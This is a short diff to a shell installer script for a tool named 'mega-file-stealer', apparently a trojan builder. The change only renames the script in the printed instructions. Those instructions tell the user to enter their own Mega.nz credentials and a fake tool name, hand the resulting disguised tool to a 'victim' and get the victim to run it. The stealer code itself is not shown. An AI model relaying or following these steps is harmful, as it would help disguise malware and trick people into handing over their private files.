@@ -16,7 +16,7 @@ chmod +x *
 # Instruction
 echo -e "\e[92mINSTRUCTION:\e[0m"
 echo -e " 1. \e[32mCreate an account in Mega.nz\e[0m"
-echo -e " 2. \e[32mRun my program by typing: python mega-file-stealer.py\e[0m"
+echo -e " 2. \e[32mRun my program by typing: python MEGA-FILE-STEALER.PY.py\e[0m"
 echo -e " 3. \e[32mEnter your mega.nz username, email anf password. Then enter any fake tool name\e[0m"
 echo -e " 4. \e[32mFind the tool that appear in your file manager, give it to your victim.\e[0m"
 echo -e " 5. \e[32mMake your victim run the script you have gave.\e[0m"
